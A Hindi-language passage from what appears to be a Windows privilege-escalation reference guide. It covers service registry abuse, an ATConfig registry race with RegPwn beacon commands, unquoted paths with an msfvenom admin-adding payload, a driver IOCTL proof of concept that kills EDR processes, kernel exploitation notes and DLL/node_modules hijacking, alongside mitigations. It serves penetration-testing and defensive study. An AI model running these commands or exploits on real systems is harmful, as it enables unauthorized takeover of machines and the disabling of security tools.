जाँचें कि किसी विशेष service key पर **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास write-capable registry permissions हैं या नहीं। केवल ACL entry होने से effective access सिद्ध नहीं होता: deny entries, current token और inherited permissions भी मायने रखते हैं। Registry-key rights, service object के `SERVICE_CHANGE_CONFIG` और `SERVICE_START` rights से अलग होते हैं। Escalation के लिए एक उपयोगी service configuration field, service को trigger करने का तरीका और अधिक privileged service identity भी आवश्यक हैं। Microsoft के [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) और [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

execute की जाने वाली binary का Path बदलने के लिए:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race से arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility features per-user **ATConfig** keys बनाते हैं, जिन्हें बाद में **SYSTEM** process HKLM session key में कॉपी करता है। Registry **symbolic link race** इस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे arbitrary HKLM **value write** primitive मिलता है।<sup>[[18]](#references)</sup>

मुख्य स्थान (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` में installed accessibility features की सूची होती है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` में user-controlled configuration store होती है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और user इसमें लिख सकता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value भरें जिसे आप SYSTEM से लिखवाना चाहते हैं।
2. Secure-desktop copy trigger करें (जैसे, **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर **oplock** लगाएँ; oplock fire होने पर **HKLM Session ATConfig** key को protected HKLM target की ओर इंगित करने वाले **registry link** से बदलें।
4. SYSTEM redirected HKLM path पर attacker-chosen value लिखता है।

Arbitrary HKLM value write मिलने के बाद, service configuration values को overwrite करके LPE तक pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे normal user start कर सके (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race के हिस्से के रूप में workstation को **lock** करता है।

Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

अगर आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, **मनमाना code execute करने के लिए यह पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

अगर executable का path quotes के अंदर नहीं है, तो Windows space से पहले के हर हिस्से को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows इन्हें execute करने की कोशिश करेगा:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Windows की built-in services से संबंधित paths को छोड़कर, सभी unquoted service paths सूचीबद्ध करें:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**आप** इस vulnerability को metasploit से detect और exploit कर सकते हैं: `exploit/windows/local/trusted\_service\_path` आप metasploit से manually एक service binary बना सकते हैं:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windows उपयोगकर्ताओं को service fail होने पर की जाने वाली कार्रवाइयाँ निर्दिष्ट करने देता है। इस सुविधा को किसी binary की ओर point करने के लिए configure किया जा सकता है। यदि इस binary को replace किया जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Scheduled task script targets

ऐसे enabled task के लिए जो `.bat` या `.cmd` file के साथ `cmd.exe /c` चलाता है, **action arguments** में दिए गए script के साथ-साथ `cmd.exe` को भी जाँचें। यही बात interpreter के explicit file argument पर भी लागू होती है, जैसे PowerShell `-File`। यदि किसी scheduled batch file में literal PowerShell `-File` call है, तो उस संदर्भित script के ACL की भी जाँच करें; variables, conditionals और shell chaining को manually trace करना आवश्यक है। Caller द्वारा writable script या parent directory, cross-account execution का संकेत तभी है जब configured task principal, caller से अलग हो और task वास्तव में उस action तक पहुँचे। Scripts के लिए append-only ACL महत्वपूर्ण हो सकता है, लेकिन पहले का `exit` या अन्य control flow जोड़ी गई lines को unreachable बना सकता है। Escalation का दावा करने से पहले effective ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger और application-control policy की पुष्टि करें। Inventory के दौरान script को modify न करें और task शुरू न करें।

## Accessible files पर named streams

NTFS पर किसी readable file में named `:$DATA` stream हो सकता है, जिसकी सामग्री सामान्य directory listing में नहीं दिखाई देती। Accessible backups या configuration files के छोटे, प्रासंगिक समूह के लिए, कोई भी content खोलने से पहले stream के **names और sizes** देखें; Windows इन्हें [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) के माध्यम से और PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) के माध्यम से दिखाता है। Secret का संकेत देने वाला stream name केवल एक lead है। File के effective read access, filesystem के stream support, stream में उपयोगी credentials होने की संभावना और उन credentials से वास्तव में authenticate होने वाले account की जाँच करें। Routine enumeration के दौरान recursive stream scans और stream contents को print करने से बचें।

## Scheduled Windows Driver Kit helper inputs

वैकल्पिक Windows Driver Kit में `StandaloneRunner.exe` शामिल है, जो अपने run directory से `command.txt`, `reboot.rsf` और project की `working\rsf.rsf` file इस्तेमाल कर सकता है। यदि कोई scheduled task या service इस helper को privileged account के साथ शुरू करता है, तो इन inputs तक low-privilege write access उस account के context में command execution करा सकता है—भले ही helper executable स्वयं protected हो। पुष्टि करें कि privileged consumer मौजूद है और **दोनों** sidecar files बनाई या modify की जा सकती हैं; केवल helper मिलना पर्याप्त नहीं है।

Scheduled task के लिए, उसके action का [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) और दोनों sidecar paths के ACLs जाँचें। यदि task working directory निर्दिष्ट नहीं करता है, तो executable की directory केवल जाँचने योग्य lead है, इस बात का प्रमाण नहीं कि task अपने inputs कहाँ से पढ़ता है। Project working-file की prerequisite भी पूरी होनी चाहिए। यह मानने के बजाय कि task SYSTEM के रूप में चलता है, वास्तविक task principal जाँचें।

## Applications

### Installed Applications

**Binaries की permissions** जाँचें (शायद आप किसी binary को overwrite करके privileges escalate कर सकें) और **folders की permissions** भी ([DLL Hijacking](dll-hijacking/index.html))।

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) पुराने Checkmk Windows agents को प्रभावित करता है, जो `C:\Windows\Temp` में command files लिखते थे और फिर replacement विफल होने पर पहले से मौजूद write-protected file को execute करते थे। Vendor ने 2.1.0p40, 2.2.0p23, 2.3.0b1 और 2.4.0b1 में इस समस्या को ठीक किया। Installed patch level की पूरी जानकारी और यह जाँचें कि प्रभावित agent operation चल सकता है या नहीं; केवल branch label, जैसे `2.1`, से exposure की पुष्टि नहीं होती। Enumeration में files बनाए या agent commands trigger किए बिना version, service state और Temp permissions जाँची जा सकती हैं।

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ADSelfService Plus build 6210 और उससे पुराने builds को प्रभावित करता था; vendor ने इसे build 6211 में ठीक किया। यह तभी प्रासंगिक है जब SAML SSO **enabled हो या पहले enabled रहा हो**। इसलिए installed-product entry या service path केवल जाँच का संकेत है, vulnerability का निष्कर्ष नहीं: exact build, SAML configuration history, service की network reachability और उसके चलने वाले account की पुष्टि करें। Service के ज़रिए code execution को उसी account के privileges मिलते हैं; SYSTEM execution के लिए instance का SYSTEM के रूप में चलना ज़रूरी है। Product के Backup directory में पढ़ी जा सकने वाली `OfflineBackup_*.ezip` एक अलग encrypted backup lead है, usable credential या इस SAML flaw का प्रमाण नहीं। Routine enumeration के दौरान इसे unpack किए बिना इसका path और access rights दर्ज करें।

#### Jenkins controller और domain-account boundaries

Windows Jenkins controller पर job बनाने या configure करने की permission और उसे शुरू करने की permission में अंतर करें: [Jenkins इन्हें अलग `Job/Create`, `Job/Configure` और `Job/Build` rights के रूप में दस्तावेज़ित करता है](https://www.jenkins.io/doc/book/security/access-control/permissions/). Configured schedule या remote trigger से build का दूसरा रास्ता मिल सकता है, लेकिन पुष्टि करें कि वह enabled है और build वास्तव में चलता है। Execution को controller या selected agent की identity मिलती है, और stored credential का उपयोग तभी हो सकता है जब job उसके scope तक पहुँच सके। अलग से, `JENKINS_HOME` metadata तक पहुँच जाँचें: Jenkins credential material और encryption keys को `credentials.xml`, `secrets/hudson.util.Secret` और `secrets/master.key` में रखता है ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). केवल इनका मौजूद होना password उजागर नहीं करता; साझा output में secrets दिखाए बिना **ज़रूरी files तक read access** और account reuse का एक अलग रास्ता सत्यापित करें। यदि उस account के पास AD user-object का `scriptPath` write right है, तो उसे cross-user execution मानने से पहले writable script path और target user के रूप में चलने वाले वास्तविक logon या scheduled consumer की पुष्टि करें। आगे group control के लिए प्रभावी AD rights अलग से सत्यापित करना ज़रूरी है।

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server या Azure Pipelines project में pipeline **बनाने या संपादित करने** की permission को उसे **queue** करने और चुने हुए agent pool का उपयोग करने की permission से अलग रखें; [Microsoft pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) और [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) को अलग-अलग दस्तावेज़ित करता है। यदि कम-privileged account script step submit कर सकता है और उस pipeline को self-hosted Windows agent पर चला सकता है, तो step [agent के configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) के रूप में execute होता है। Cross-user या SYSTEM transition का दावा करने से पहले exact pipeline, branch/resource restrictions, authorized pool, चल सकने वाले job और agent service identity की पुष्टि करें। Installed agent, project role या repository write अकेले केवल जाँच का संकेत हैं; passive enumeration के दौरान build शुरू किए बिना permissions और local service metadata की समीक्षा करें।

#### Microsoft Entra Connect Sync credentials

[Microsoft अंतर बताता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account** के बीच, जो synchronization service चलाता है और अपने SQL database तक पहुँचता है, और **AD DS connector account** के बीच, जिसकी directory permissions configured sync features पर निर्भर करती हैं। Connector credentials उस database में encrypted रूप से stored होते हैं, और key material [ADSync service account के तहत DPAPI द्वारा protected होता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)। Installed sync service, local administrator जैसा नाम वाला group या database की visibility अकेले decrypt किए जा सकने वाले credential या domain escalation को साबित नहीं करती। वास्तविक database read rights, service-account/key access, installation और SQL layout, configured connector identity और उस identity के प्रभावी AD privileges की अलग-अलग समीक्षा करें। Routine enumeration में केवल service और access metadata दिखाएँ; stored secrets को query या print न करें।

#### Printer driver support DLL permissions

Installed printer driver अपनी support DLLs को `C:\ProgramData` में रख सकता है और उन्हें अधिक privileged print process में load कर सकता है। Printer WMI enumeration से मना होने पर भी exact driver directory और DLL ACLs की समीक्षा करें, जिसमें parent directories और reparse points शामिल हों। [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) के लिए रिपोर्ट किया गया path `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` था; [मूल disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) `PrintIsolationHost.exe` द्वारा DLL loading का वर्णन करता है। Writable ACL केवल जाँच का संकेत है: deny entries के बाद प्रभावी write access, संबंधित driver के installed होने और privileged identity के तहत file load करने, तथा vendor के updated driver या security program द्वारा installation ठीक किए जाने की पुष्टि करें। केवल directory name या driver version के आधार पर vulnerability न मानें।

### Write Permissions

जाँचें कि क्या आप किसी config file को modify करके किसी special file को पढ़ सकते हैं, या किसी ऐसे binary को modify कर सकते हैं जिसे Administrator account चलाने वाला है (schedtasks)।

System में कमजोर folder/files permissions ढूँढ़ने का एक तरीका यह है:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders में मौजूद किसी भी plugin DLL को autoload करता है। अगर writable portable/copy install मौजूद है, तो malicious plugin डालने से हर बार लॉन्च पर `notepad++.exe` के अंदर automatic code execution होता है (जिसमें `DllMain` और plugin callbacks भी शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर चलाना

**जाँचें कि क्या आप किसी ऐसे registry या binary को overwrite कर सकते हैं, जिसे कोई दूसरा user execute करने वाला है।**\
**Privileges escalate करने के लिए दिलचस्प autoruns locations** के बारे में अधिक जानने हेतु **यह पेज पढ़ें**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third-party अजीब/कमज़ोर** drivers खोजें.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

यदि कोई driver arbitrary kernel read/write primitive (खराब तरीके से डिज़ाइन किए गए IOCTL handlers में आम) उपलब्ध कराता है, तो kernel memory से सीधे SYSTEM token चुराकर privilege escalate किया जा सकता है।<sup>[[13]](#references)</sup> चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel-exploitation से संबंधित सामग्री:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

ऐसे race-condition bugs में, जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने से (max-length components या गहरी directory chains का उपयोग करके) समय-अवधि microseconds से बढ़ाकर tens of microseconds तक की जा सकती है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures और I/O ring pivots

कुछ Windows kernel LPE chains दो अलग-अलग कमज़ोर bugs से बनाई जा सकती हैं: एक **cancel-safe queue lifetime race**, जो queue lock के अभी भी held रहने पर request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation को leak करता है।<sup>[[29]](#references)</sup>

Audit और exploitation से जुड़े नोट्स:

- **Free-under-lock + cancel afterwards**: ऐसे success path की तलाश करें जो **Acquire -> CompleteRequest/free -> Release** करता हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करता हो। यदि success path, CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुँचता है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में फिर से शुरू होकर freed `PFLT_CALLBACK_DATA` को driver के remove callback में पास कर सकता है।
- Freed queue object को समान आकार वाले, attacker-controlled paged-pool allocation से **reclaim** करें। `NPFS` Data Queue Entries उपयोगी होते हैं, क्योंकि उनका payload और size नियंत्रित किया जा सकता है और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object में list links हों, तो उन्हें user memory में मौजूद **fake request nodes की cyclic list** से overwrite करें, ताकि driver मूल list head पर रुकने के बजाय attacker-defined request structures को बार-बार process करे।
- **Predictable write को upgrade करें**: यदि fake request, bookkeeping writes (timestamps / QPC / refcount-adjacent fields) के लिए उपयोग किए जाने वाले nested context pointer को redirect करती है, तो आपको **address-controlled लेकिन value-controlled नहीं** kernel write मिल सकता है। ऐसी स्थिति में, अंतिम code/data pointer के बजाय sprayed pool object के **length/size** field को target करें, फिर spray में objects को तब तक enumerate करें जब तक corrupted object से **out-of-bounds paged-pool read** न मिल जाए।
- **Raceable disclosure pattern**: कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता है, एक अच्छा candidate है। यदि attacker copied buffer का आकार बढ़ा सकता है (उदाहरण के लिए, कई list/resource entries जोड़कर, जिससे serializer का final allocation size बढ़ जाता है), तो reliability बेहतर होती है, क्योंकि लंबी copy replacement window को बढ़ा देती है और ज़रूरी नहीं कि machine crash हो।
- **Pointer-rich refill targets**: Windows **I/O ring** के registered-buffer arrays बेहतरीन disclosure targets हैं, क्योंकि उनका paged-pool size attacker-controlled होता है (`8 * regBufferCnt`) और हर element, `_IOP_MC_BUFFER_ENTRY` का kernel pointer होता है। इनमें से किसी एक array को leak करें, आसपास का `IORING_OBJECT` प्राप्त करें, फिर **`RegBuffers`** और **`RegBuffersCount`** को corrupt करें, ताकि बाद के I/O ring operations attacker-forged entries का उपयोग करें और arbitrary kernel read/write दें। यदि उपलब्ध एकमात्र write से आपको स्थिर byte मिलता है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो `0x0101010101010101` जैसे repeated-byte user pointer बनाने के लिए **overlapping unaligned writes** का उपयोग करें, उसे `VirtualAlloc` से map करें, और forged registered-buffer array वहाँ रखें।<sup>[[30]](#references)</sup>

Debugging के उपयोगी संकेत:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

एक बार corrupted I/O ring से arbitrary kernel read/write प्राप्त कर लेने के बाद, standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities से आप deterministic layouts groom कर सकते हैं, writable HKLM/HKU descendants का दुरुपयोग कर सकते हैं, और custom driver के बिना metadata corruption को kernel paged-pool overflows में बदल सकते हैं। पूरी chain यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Attacker-controlled paths से `RtlQueryRegistryValues` direct-mode type confusion

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह validate करते हैं कि वह एक उचित UTF-16 string है, और फिर stack scalar जैसे `int readValue` में `RTL_QUERY_REGISTRY_DIRECT` के साथ `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद न हो, तो `EntryContext` की व्याख्या developer की अपेक्षा वाले type के बजाय registry के **वास्तविक** type के अनुसार की जाती है।

इससे दो उपयोगी primitives बनते हैं:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path से driver attacker-chosen keys query कर सकता है, return codes/logs के ज़रिए उनके अस्तित्व का पता दे सकता है, और कभी-कभी ऐसी values पढ़ सकता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination registry value type के आधार पर `REG_QWORD`, `UNICODE_STRING`, या sized binary buffer के रूप में type-confused हो जाता है।

व्यावहारिक exploitation नोट्स:

- **Windows 8+ mitigation**: यदि query `RTL_QUERY_REGISTRY_DIRECT` के साथ किसी **untrusted hive** तक पहुँचती है, लेकिन उसमें `RTL_QUERY_REGISTRY_TYPECHECK` नहीं है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए, `HKCU` के अंतर्गत values stage करने के बजाय **trusted system hives के अंदर attacker-writable keys** खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, और sandboxed contexts से पहुँच योग्य keys खोजने के लिए duplicated **low-integrity** token के साथ scan दोबारा चलाएँ:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` में 8-byte का direct write करने से आस-पास का stack data corrupt हो जाता है और पास के callback/function pointer का कुछ हिस्सा overwrite हो सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का `UNICODE_STRING` की ओर point करना अपेक्षित है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए दोबारा इस्तेमाल करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित करता है और `Buffer` pointer को आंशिक रूप से प्रभावित करता है, जिससे kernel में semi-controlled write संभव होता है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर मौजूद पहले `LONG` को signed buffer size मानता है। अगर पहले के `REG_DWORD` read से reused scalar में attacker-controlled **negative** value रह जाती है, तो अगली `REG_BINARY` query attacker के bytes को सीधे आस-पास के stack slots पर copy करती है। अक्सर callback-pointer को पूरी तरह overwrite करने का यह सबसे साफ़ तरीका होता है।

मज़बूत hunting pattern: **एक ही stack variable में बिना उसे दोबारा initialize किए अलग-अलग प्रकार के registry reads करना**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, दोबारा इस्तेमाल किए गए `EntryContext` pointers, और उन code paths को grep करें जहाँ पहला registry read तय करता है कि दूसरा read होगा या नहीं।

#### Device objects पर FILE_DEVICE_SECURE_OPEN सेट न होने का दुरुपयोग (LPE + EDR kill)

कुछ signed third-party drivers `IoCreateDeviceSecure` के ज़रिए मज़बूत SDDL के साथ अपना device object बनाते हैं, लेकिन `DeviceCharacteristics` में `FILE_DEVICE_SECURE_OPEN` सेट करना भूल जाते हैं। इस flag के बिना, जब device को किसी ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, तो secure DACL लागू नहीं होता। इससे कोई भी unprivileged user इस तरह का namespace path इस्तेमाल करके handle प्राप्त कर सकता है:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले से)

एक बार user device खोल सके, तो driver द्वारा उपलब्ध कराए गए privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक मामलों में देखी गई क्षमताओं के उदाहरण:
- मनमाने processes के लिए full-access handles लौटाना (token theft / DuplicateTokenEx/CreateProcessAsUser के ज़रिए SYSTEM shell)।
- बिना किसी पाबंदी के raw disk read/write (offline tampering, boot-time persistence tricks)।
- Protected Process/Light (PP/PPL) समेत मनमाने processes को terminate करना, जिससे kernel के ज़रिए user land से AV/EDR kill किया जा सके।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

डेवलपर्स के लिए mitigations
- DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context को validate करें। Process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

defenders के लिए detection के विचार
- संदिग्ध device names (जैसे, \\ .\\amsdk*) के user-mode opens और abuse का संकेत देने वाले विशिष्ट IOCTL sequences को monitor करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

अगर आपके पास **PATH में मौजूद किसी folder के अंदर write permissions** हैं, तो आप किसी process द्वारा load की गई DLL को hijack करके **privileges escalate** कर सकते हैं।<sup>[[2]](#references)</sup>

PATH के सभी folders की permissions जांचें:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

इस जाँच का दुरुपयोग कैसे किया जा सकता है, इसकी अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` के ज़रिए Node.js / Electron module resolution hijacking

यह **Windows uncontrolled search path** का एक प्रकार है, जो **Node.js** और **Electron** applications को तब प्रभावित करता है, जब वे `require("foo")` जैसा bare import करते हैं और अपेक्षित module **मौजूद नहीं होता**।<sup>[[20]](#references)</sup>

Node, directory tree में ऊपर की ओर जाते हुए हर parent में `node_modules` folders की जाँच करता है। Windows पर यह खोज drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application इन paths को जाँच सकता है:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **कम-विशेषाधिकार वाला user** `C:\node_modules` बना सकता है, तो वह उसमें malicious `foo.js` (या package folder) रख सकता है और किसी **अधिक-विशेषाधिकार वाले Node/Electron process** के missing dependency को resolve करने की प्रतीक्षा कर सकता है। Payload, victim process के security context में execute होता है। इसलिए यह **LPE** बन जाता है, जब target administrator के रूप में, किसी elevated scheduled task/service wrapper से, या अपने-आप शुरू होने वाले privileged desktop app से चलता है।

यह खास तौर पर तब आम है, जब:

- कोई dependency `optionalDependencies` में घोषित हो<sup>[[22]](#references)</sup>
- कोई third-party library `require("foo")` को `try/catch` में रखती हो और विफलता के बाद भी आगे चलती हो
- production builds से कोई package हटा दिया गया हो, packaging के दौरान शामिल न किया गया हो, या install विफल रहा हो
- vulnerable `require()` मुख्य application code के बजाय dependency tree में गहराई में हो

### Vulnerable targets की खोज

Resolution path को साबित करने के लिए **Procmon** का उपयोग करें:<sup>[[23]](#references)</sup>

